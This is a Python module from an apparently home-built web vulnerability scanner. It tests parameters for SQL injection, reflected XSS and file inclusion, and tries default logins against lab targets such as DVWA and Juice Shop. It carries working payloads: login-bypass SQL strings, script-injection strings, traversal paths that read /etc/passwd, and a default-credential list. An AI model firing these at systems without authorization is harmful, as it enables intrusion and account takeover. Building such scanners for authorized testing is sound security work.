"""
vuln/vuln_detector.py — PHASE 3 (Weeks 13-18)

Rule-based only, per Phase 3 scope decision -- no AI hooks, no --ai flag,
no ANTHROPIC_API_KEY gating here. The AI-assisted false-positive triage
layer originally scoped for this phase is deferred and will be built
later alongside Phase 5's AI report generator, in one dedicated "AI
integration" pass once API billing is set up.

Every detector below follows the same rule: a finding is only marked
confirmed=True if we can point to actual verified evidence that the
backend behaved differently because of the payload -- not just "the
payload string showed up somewhere" or "we got a 200 OK". That's the
false-positive discipline this phase exists to build.

Finding schema (dict, matches the plain-dict convention already used
by scanner/port_scanner.py -- no new class introduced):
    {
        "type": "SQLi" | "XSS" | "LFI",
        "param": str,
        "payload": str,
        "severity": "high" | "medium" | "low",
        "evidence": str,               # human-readable proof of the finding
        "confirmed": bool,             # True only if actually verified
        "verification_method": str,    # "boolean_diff" | "time_based" |
                                        # "error_signature" |
                                        # "reflected_unescaped" |
                                        # "content_pattern_match" |
                                        # "auth_bypass_status_diff"
    }
"""

import json
import os
import re
import time
import uuid
import requests
from phantomstrike.core.config import OUTPUT_DIR, HTTP_REQUEST_TIMEOUT
from phantomstrike.utils import logger
from phantomstrike.core.target_profile import TargetProfile, Endpoint


# --- SQLi -----------------------------------------------------------------

# Used for error-signature probing only. NOTE: the original stub's list
# included a SLEEP(5) payload here too -- pulled out into its own
# dedicated time-based check below instead, so this loop doesn't burn an
# extra 5+ seconds sending a timing payload to a check that isn't timing
# anything.
SQLI_PAYLOADS = [
    "'",
    "''",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
]

# TRUE/FALSE pairs for boolean-based confirmation. Each pair is designed
# so the TRUE condition should return more/different data than the FALSE
# condition IF the input reaches the query unsanitized. Several shapes
# are tried since one comment style might work where another gets
# filtered (numeric vs string context, comment style, etc.).
SQLI_BOOLEAN_PAIRS = [
    ("1' OR '1'='1", "1' OR '1'='2"),
    ("1) OR (1=1", "1) OR (1=2"),
    ("1 OR 1=1", "1 OR 1=2"),
]

SQLI_SLEEP_PAYLOAD = "1' OR SLEEP(5)-- -"
SQLI_TIME_DELAY_SECONDS = 5

# Comment-based auth-bypass payloads -- a DIFFERENT mechanism from
# SQLI_BOOLEAN_PAIRS above, discovered as a real gap during Juice Shop
# testing (Phase 3 generalization pass). SQLI_BOOLEAN_PAIRS makes the
# WHERE clause always-true (`... OR '1'='1'`) but leaves the rest of the
# query intact -- on a login query shaped like
# `WHERE email='<input>' AND password='<hash>'`, an always-true email
# clause still fails because the password comparison still runs and
# still doesn't match. These payloads instead use `--`/`#` to comment out
# everything AFTER the injection point, deleting the password check
# entirely rather than satisfying it. Confirmed manually against Juice
# Shop's /rest/user/login (' or 1=1-- as email logs in as the first user
# in the DB with any password) where every SQLI_BOOLEAN_PAIRS payload
# failed identically to a real wrong-password attempt.
SQLI_AUTH_BYPASS_PAYLOADS = [
    "' or 1=1--",
    "' or 1=1-- -",
    "' or '1'='1'--",
    "admin'--",
    "' or 1=1#",
]

SQL_ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "sqlite3.operationalerror",
    "ora-01756",
    "ora-00933",
    "pg_query()",
    "postgresql query failed",
]

# --- XSS --------------------------------------------------------------

# {token} gets replaced with a fresh uuid4 fragment on every run, so a
# "confirmed" match can only mean OUR payload came back unescaped --
# never a coincidental string already present on the page.
XSS_PAYLOAD_TEMPLATES = [
    "<script>alert('{token}')</script>",
    "\"><script>alert('{token}')</script>",
    "<img src=x onerror=alert('{token}')>",
]

# --- LFI ----------------------------------------------------------------

# Traversal depth is inherently install-specific -- how many directory
# levels separate the vulnerable script from filesystem root varies by
# where the app is deployed. Empirical testing against this DVWA
# install (sweeping depths 1-6, confirmed via error log ground truth)
# showed depth 6 is what's actually needed here; the originally assumed
# depth of 4 never worked regardless of security level, since it's a
# path-depth problem, not a filtering problem. Multiple depths are
# included below (4-8) so the detector has a real chance of landing on
# the right depth on a different install without needing a dynamic
# sweep -- a known limitation, not a full fix.
_TRAVERSAL_DEPTHS = [4, 5, 6, 7, 8]

LFI_PAYLOADS = [
    *(("../" * n) + "etc/passwd" for n in _TRAVERSAL_DEPTHS),
    "/etc/passwd%00",
    "../../../../../../etc/passwd%00",
    # Bare absolute path, no traversal at all. Some includes (e.g.
    # `include($_GET['page'])` with no path prefix concatenation) pass
    # this straight through -- confirmed via direct curl testing against
    # DVWA-low, where traversal payloads at the wrong depth returned
    # nothing but this did.
    "/etc/passwd",
]

# Matches a real /etc/passwd root entry -- this is the actual proof of
# file read, not just "response looks different" or "status 200".
LFI_PASSWD_PATTERN = re.compile(r"root:.*?:0:0:")


# --- Default credentials --------------------------------------------------

# Short and deliberately conservative -- this is functionally a brute
# force attack, only ever run against systems you own.
DEFAULT_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("root", "root"),
    ("root", "toor"),
]

# DVWA's login.php shows this exact string on a failed attempt. Its
# ABSENCE from the post-login response is the actual proof of success --
# not status code alone, since login.php can return 200 on both
# outcomes depending on DVWA version/config.
LOGIN_FAILED_STRING = "Login failed"

# Scrapes the single-use CSRF token DVWA embeds on login.php. Confirmed
# present via direct curl inspection before writing this detector.
USER_TOKEN_PATTERN = re.compile(r"name='user_token' value='([a-f0-9]+)'")


class VulnDetector:
    def __init__(self, target_url: str, session_cookie: str = None, extra_params: dict = None,
                 profile: TargetProfile = None, endpoint: Endpoint = None):
        self.target_url = target_url
        self.session_cookie = session_cookie  # needed for authenticated DVWA testing
        # Static params merged into every request alongside the payload --
        # e.g. {"Submit": "Submit"} for DVWA, which silently no-ops the
        # query without its submit-button param present. Discovered by
        # comparing raw curl with/without Submit=Submit during Phase 3
        # testing: identical payload, but no query executed without it.
        self.extra_params = extra_params or {}
        self.findings = []

        # Profile-driven mode (optional). When both are set, _send()
        # uses the endpoint's method/body_type/default_params instead
        # of the legacy GET-only/query-string-only path below. Legacy
        # single-target/--param callers leave these as None and get
        # unchanged behavior.
        self.profile = profile
        self.endpoint = endpoint
        if endpoint is not None:
            # endpoint's own target_url/cookie take precedence over the
            # legacy constructor args, since profile mode is the source
            # of truth for its own requests
            self.target_url = endpoint.url
            if profile and profile.auth.cookie:
                self.session_cookie = profile.auth.cookie
            self.extra_params = endpoint.extra_static_params

    # --- shared helpers ---------------------------------------------------

    def _send(self, param_name: str, payload: str):
        """
        Send `payload` as `param_name` against self.target_url.
        Returns the Response object, or None if the request itself failed
        (timeout, connection refused, DNS failure, etc.) -- callers must
        treat None as "couldn't test this payload", never as a negative
        result. Same graceful-degradation pattern as crt.sh in Phase 1.

        LEGACY MODE (self.endpoint is None): unchanged from the original
        implementation -- GET request, query-string params. This is
        what every --target/--param CLI invocation still uses.

        PROFILE MODE (self.endpoint is set): uses endpoint.method
        (GET/POST) and endpoint.body_type (query/json) to build the
        request. Every OTHER test_param on the endpoint gets its
        default_params baseline value, so injecting into one param
        doesn't break the request by leaving required fields empty.
        Applies profile.rate_limit_ms as a delay before sending, so a
        real engagement doesn't hammer the target.

        self.session_cookie is a raw cookie header string, e.g.
        "PHPSESSID=xxx; security=low" -- copy-pasted straight from
        devtools. Sent as a literal Cookie header rather than built
        into a dict, since targets like DVWA gate content behind
        MULTIPLE cookies (session + security level), not just one.
        """
        headers = {"Cookie": self.session_cookie} if self.session_cookie else None

        if self.endpoint is None:
            # Legacy path -- unchanged.
            params = {param_name: payload, **self.extra_params}
            try:
                return requests.get(
                    self.target_url,
                    params=params,
                    headers=headers,
                    timeout=HTTP_REQUEST_TIMEOUT,
                )
            except requests.exceptions.RequestException as e:
                logger.warning(f"Request failed for payload {payload[:50]!r}: {e}")
                return None

        # Profile-driven path.
        if self.profile and self.profile.rate_limit_ms > 0:
            time.sleep(self.profile.rate_limit_ms / 1000.0)

        # Start from every param's default/baseline value, then
        # overwrite the one being tested with the actual payload --
        # this keeps the request well-formed even when other required
        # fields (sort, page, submit buttons, etc.) are present.
        body = dict(self.endpoint.default_params)
        body[param_name] = payload
        body.update(self.endpoint.extra_static_params)

        try:
            if self.endpoint.method == "POST":
                if self.endpoint.body_type == "json":
                    return requests.post(
                        self.target_url,
                        json=body,
                        headers=headers,
                        timeout=HTTP_REQUEST_TIMEOUT,
                    )
                else:
                    return requests.post(
                        self.target_url,
                        data=body,
                        headers=headers,
                        timeout=HTTP_REQUEST_TIMEOUT,
                    )
            else:
                # GET -- body_type is effectively always "query" here,
                # since GET requests don't carry a JSON body.
                return requests.get(
                    self.target_url,
                    params=body,
                    headers=headers,
                    timeout=HTTP_REQUEST_TIMEOUT,
                )
        except requests.exceptions.RequestException as e:
            logger.warning(f"Request failed for payload {payload[:50]!r}: {e}")
            return None

    @staticmethod
    def _make_finding(vuln_type, param, payload, severity, evidence, confirmed, verification_method):
        return {
            "type": vuln_type,
            "param": param,
            "payload": payload,
            "severity": severity,
            "evidence": evidence,
            "confirmed": confirmed,
            "verification_method": verification_method,
        }

    def _resolve_test_params(self, param_name: str = None) -> list:
        """
        PROFILE MODE (self.endpoint set): test_params comes straight from
        the endpoint -- this is what lets detect_sqli/xss/lfi run against
        every field on an endpoint automatically instead of one manual
        call per param.

        LEGACY MODE (self.endpoint is None): unchanged behavior, just the
        single param_name passed in by the CLI caller, wrapped in a list
        so both modes can share one loop in the detectors below.
        """
        if self.endpoint is not None:
            return self.endpoint.test_params
        if param_name is None:
            raise ValueError(
                "param_name is required when no profile/endpoint is set "
                "(legacy mode needs an explicit --param)"
            )
        return [param_name]

    def _strip_noise(self, text: str) -> str:
        """
        Strips profile.noise_patterns (regexes for session tokens,
        timestamps, CSRF nonces, etc.) out of response text before
        length/content comparisons. Exists because boolean_diff's
        "ignore small diffs" threshold is a blunt instrument -- a page
        with a per-request nonce embedded in it will show a byte-count
        diff on EVERY request pair regardless of whether the SQLi
        payload did anything, and that noise can mask or fake a real
        diff. No-ops in legacy mode (no profile) or if the profile
        defines no noise_patterns, so existing behavior is unchanged
        unless a profile opts into this.
        """
        if not self.profile or not self.profile.noise_patterns:
            return text
        for pattern in self.profile.noise_patterns:
            text = re.sub(pattern, "", text)
        return text

    # --- detectors ----------------------------------------------------------

    def detect_sqli(self, param_name: str = None) -> list:
        """
        Public entry point -- resolves which param(s) to test (one in
        legacy mode, all of endpoint.test_params in profile mode) and
        runs the real per-param logic (_detect_sqli_single) against each.
        """
        findings = []
        for p in self._resolve_test_params(param_name):
            findings.extend(self._detect_sqli_single(p))
        return findings

    def _detect_sqli_single(self, param_name: str) -> list:
        """
        Three independent confirmations, each proving the backend query
        actually changed because of our input -- not just guessing from
        the payload string itself:
          1. boolean_diff    -- TRUE vs FALSE condition, compare response bodies
          2. time_based      -- SLEEP(5) payload vs baseline response time
          3. error_signature -- DB error string reflected back (secondary,
             lower-confidence: proves the input reached the query
             unsanitized, doesn't by itself prove exploitability)
        """
        findings = []
        logger.info(f"Testing '{param_name}' for SQL injection...")

        # 1. Boolean-based
        for true_payload, false_payload in SQLI_BOOLEAN_PAIRS:
            true_resp = self._send(param_name, true_payload)
            false_resp = self._send(param_name, false_payload)
            if true_resp is None or false_resp is None:
                continue

            true_text = self._strip_noise(true_resp.text)
            false_text = self._strip_noise(false_resp.text)

            len_diff = abs(len(true_text) - len(false_text))
            if len_diff > 20:  # ignore small diffs (timestamps/nonces/etc.)
                evidence = (
                    f"TRUE payload '{true_payload}' returned {len(true_text)} bytes, "
                    f"FALSE payload '{false_payload}' returned {len(false_text)} bytes "
                    f"(diff={len_diff}, noise-stripped)"
                )
                findings.append(self._make_finding(
                    "SQLi", param_name, true_payload, "high", evidence,
                    True, "boolean_diff",
                ))
                logger.finding("high", f"Boolean-based SQLi confirmed on '{param_name}'")
                break  # one confirmed pair is enough evidence for this param

        # 2. Time-based (catches blind SQLi with no visible output difference)
        baseline_start = time.time()
        baseline_resp = self._send(param_name, "1")
        baseline_elapsed = time.time() - baseline_start

        if baseline_resp is not None:
            sleep_start = time.time()
            sleep_resp = self._send(param_name, SQLI_SLEEP_PAYLOAD)
            sleep_elapsed = time.time() - sleep_start

            if (sleep_resp is not None
                    and baseline_elapsed < 2.0
                    and sleep_elapsed > (SQLI_TIME_DELAY_SECONDS - 1)):
                evidence = (
                    f"baseline={baseline_elapsed:.2f}s, "
                    f"SLEEP({SQLI_TIME_DELAY_SECONDS}) payload={sleep_elapsed:.2f}s"
                )
                findings.append(self._make_finding(
                    "SQLi", param_name, SQLI_SLEEP_PAYLOAD, "high", evidence,
                    True, "time_based",
                ))
                logger.finding("high", f"Time-based blind SQLi confirmed on '{param_name}' -- {evidence}")

        # 3. Error-signature (secondary/lower-confidence signal)
        for payload in SQLI_PAYLOADS:
            resp = self._send(param_name, payload)
            if resp is None:
                continue
            body_lower = resp.text.lower()
            for sig in SQL_ERROR_SIGNATURES:
                if sig in body_lower:
                    evidence = f"Response contained DB error signature: '{sig}'"
                    findings.append(self._make_finding(
                        "SQLi", param_name, payload, "medium", evidence,
                        True, "error_signature",
                    ))
                    logger.finding("medium", f"Error-based SQLi signal on '{param_name}' -- {sig}")
                    break  # one signature match per payload is enough

        # 4. Auth-bypass via comment truncation (login-endpoint pattern).
        # Different signal from boolean_diff/error_signature above: these
        # payloads are DESIGNED to look like a normal successful response,
        # not a different-looking one, so a body-diff or error-string
        # check would never catch this. Instead we compare HTTP status
        # codes -- a known-bad baseline value should get an auth-failure
        # status (4xx on a REST API), and if the payload flips that to a
        # 2xx, that's real evidence the injected `--`/`#` truncated the
        # query and deleted a check (e.g. password comparison) that
        # should have run. The baseline-status guard below prevents this
        # from false-firing on non-auth endpoints where everything just
        # returns 200 regardless of input.
        baseline_resp = self._send(param_name, "definitely_wrong_baseline_value")
        if baseline_resp is not None and baseline_resp.status_code >= 400:
            for payload in SQLI_AUTH_BYPASS_PAYLOADS:
                resp = self._send(param_name, payload)
                if resp is None:
                    continue
                if resp.status_code < 300:
                    evidence = (
                        f"Baseline (known-bad value) returned HTTP {baseline_resp.status_code}, "
                        f"payload '{payload}' returned HTTP {resp.status_code} -- comment-based "
                        f"injection likely truncated the query and bypassed a downstream check"
                    )
                    findings.append(self._make_finding(
                        "SQLi", param_name, payload, "critical", evidence,
                        True, "auth_bypass_status_diff",
                    ))
                    logger.finding(
                        "critical",
                        f"Auth-bypass SQLi confirmed on '{param_name}' via comment truncation",
                    )
                    break  # one confirmed bypass is enough evidence for this param

        return findings

    def detect_xss(self, param_name: str = None) -> list:
        """Public entry point -- see detect_sqli() docstring above."""
        findings = []
        for p in self._resolve_test_params(param_name):
            findings.extend(self._detect_xss_single(p))
        return findings

    def _detect_xss_single(self, param_name: str) -> list:
        """
        Reflected XSS only (stored XSS is the stretch goal noted in the
        original stub). A finding is confirmed only if the EXACT payload
        string -- including angle brackets -- comes back verbatim. If the
        server HTML-encodes it (&lt;script&gt;...) that's proof it's NOT
        vulnerable, and we correctly report nothing.
        """
        findings = []
        logger.info(f"Testing '{param_name}' for reflected XSS...")

        for template in XSS_PAYLOAD_TEMPLATES:
            token = uuid.uuid4().hex[:8]
            payload = template.format(token=token)
            resp = self._send(param_name, payload)
            if resp is None:
                continue

            if payload in resp.text:
                evidence = f"Unescaped payload reflected verbatim (token={token}): {payload}"
                findings.append(self._make_finding(
                    "XSS", param_name, payload, "high", evidence,
                    True, "reflected_unescaped",
                ))
                logger.finding("high", f"Reflected XSS confirmed on '{param_name}' (token={token})")

        return findings

    def detect_lfi(self, param_name: str = None) -> list:
        """Public entry point -- see detect_sqli() docstring above."""
        findings = []
        for p in self._resolve_test_params(param_name):
            findings.extend(self._detect_lfi_single(p))
        return findings

    def _detect_lfi_single(self, param_name: str) -> list:
        """
        Confirms via actual /etc/passwd content pattern match -- not
        "response changed" or "status 200", both of which are unreliable
        (a 500 error page changes the response too, and plenty of normal
        requests return 200).
        """
        findings = []
        logger.info(f"Testing '{param_name}' for local file inclusion...")

        for payload in LFI_PAYLOADS:
            resp = self._send(param_name, payload)
            if resp is None:
                continue

            match = LFI_PASSWD_PATTERN.search(resp.text)
            if match:
                evidence = f"Response contains passwd entry: {match.group(0)}"
                findings.append(self._make_finding(
                    "LFI", param_name, payload, "high", evidence,
                    True, "content_pattern_match",
                ))
                logger.finding("high", f"LFI confirmed on '{param_name}' -- {evidence}")

        return findings

    def check_default_creds(self, login_url: str = None, creds_list: list = None) -> list:
        """
        Tries a short list of default credential pairs against a login
        form. Confirms success via the ACTUAL absence of the login-
        failure string in the response -- not status code alone, since
        login pages often return 200 on both success and failure.

        Uses requests.Session() rather than the module's _send() helper
        -- this needs cookie persistence across the token-fetch GET and
        the login POST, which a one-shot request can't provide.

        PROFILE MODE (self.profile is set): field names, CSRF handling,
        and the failure-string signal all come from profile.auth
        (field_map / csrf_token / failure_string) instead of being
        hardcoded -- this is what makes credential checking work
        against a target whose login form doesn't look like DVWA's.
        login_url falls back to profile.auth.login_url if not passed
        explicitly.

        LEGACY MODE (self.profile is None): unchanged from the original
        implementation -- hardcoded DVWA field names (username,
        password, Login, user_token) and the DVWA-specific
        "Login failed" string, exactly as before.
        """
        findings = []
        creds = creds_list or DEFAULT_CREDS

        if self.profile is not None:
            auth = self.profile.auth
            target_login_url = login_url or auth.login_url
            if not target_login_url:
                logger.error(
                    "No login_url available -- set auth.login_url in the "
                    "profile or pass login_url explicitly"
                )
                return findings

            username_field = auth.field_map.get("username_field", "username")
            password_field = auth.field_map.get("password_field", "password")
            submit_field = auth.field_map.get("submit_field")
            submit_value = auth.field_map.get("submit_value")
            failure_string = auth.failure_string or LOGIN_FAILED_STRING

            csrf_present = auth.csrf_token.get("present", False)
            csrf_field_name = auth.csrf_token.get("field_name")
            csrf_regex = auth.csrf_token.get("regex")
            csrf_pattern = re.compile(csrf_regex) if (csrf_present and csrf_regex) else None
        else:
            if not login_url:
                logger.error("check_default_creds() requires login_url in legacy mode")
                return findings
            target_login_url = login_url
            username_field, password_field = "username", "password"
            submit_field, submit_value = "Login", "Login"
            failure_string = LOGIN_FAILED_STRING
            csrf_field_name = "user_token"
            csrf_pattern = USER_TOKEN_PATTERN

        logger.info(f"Testing default credentials against {target_login_url}")

        for username, password in creds:
            session = requests.Session()
            try:
                get_resp = session.get(target_login_url, timeout=HTTP_REQUEST_TIMEOUT)
            except requests.exceptions.RequestException as e:
                logger.warning(f"Could not fetch login page: {e}")
                continue

            token = None
            if csrf_pattern is not None:
                token_match = csrf_pattern.search(get_resp.text)
                token = token_match.group(1) if token_match else None

            post_data = {username_field: username, password_field: password}
            if submit_field and submit_value:
                post_data[submit_field] = submit_value
            if token and csrf_field_name:
                post_data[csrf_field_name] = token

            try:
                post_resp = session.post(target_login_url, data=post_data, timeout=HTTP_REQUEST_TIMEOUT)
            except requests.exceptions.RequestException as e:
                logger.warning(f"Login attempt failed for {username}:{password} -- {e}")
                continue

            if failure_string not in post_resp.text:
                evidence = f"Login succeeded with {username}:{password} -- '{failure_string}' absent from response"
                findings.append(self._make_finding(
                    "DefaultCreds", "login", f"{username}:{password}", "critical", evidence,
                    True, "login_failure_string_absent",
                ))
                logger.finding("critical", f"Default credentials confirmed: {username}:{password}")

        self.findings.extend(findings)
        out_path = self._save_findings()
        logger.success(f"Credential check complete: {len(findings)} confirmed finding(s), saved to {out_path}")
        return findings

    def _save_findings(self) -> str:
        """
        Shared save logic used by both run_all() and check_default_creds()
        -- extracted so credential-check results actually get persisted
        to output/ instead of only being logged and discarded (the gap
        that surfaced when check_default_creds() was first tested live:
        the finding printed to console but no JSON file was written).
        """
        os.makedirs(OUTPUT_DIR, exist_ok=True)
        safe_name = self.target_url.replace("://", "_").replace("/", "_")
        out_path = os.path.join(OUTPUT_DIR, f"vuln_{safe_name}.json")
        with open(out_path, "w") as f:
            json.dump(self.findings, f, indent=2)
        return out_path

    def run_all(self, param_name: str = None) -> list:
        """
        Orchestrates all detectors and saves results. In profile mode
        (self.endpoint set), param_name can be omitted entirely -- each
        detector resolves and loops over endpoint.test_params on its
        own. In legacy mode, param_name is still required (each detector
        raises ValueError via _resolve_test_params if it's missing).
        """
        logger.info(f"Starting vulnerability scan against {self.target_url}")

        for detector in (self.detect_sqli, self.detect_xss, self.detect_lfi):
            try:
                self.findings.extend(detector(param_name))
            except NotImplementedError:
                pass

        out_path = self._save_findings()
        confirmed_count = sum(1 for f in self.findings if f["confirmed"])
        logger.success(f"Vulnerability scan complete: {confirmed_count} confirmed finding(s), saved to {out_path}")
        return self.findings
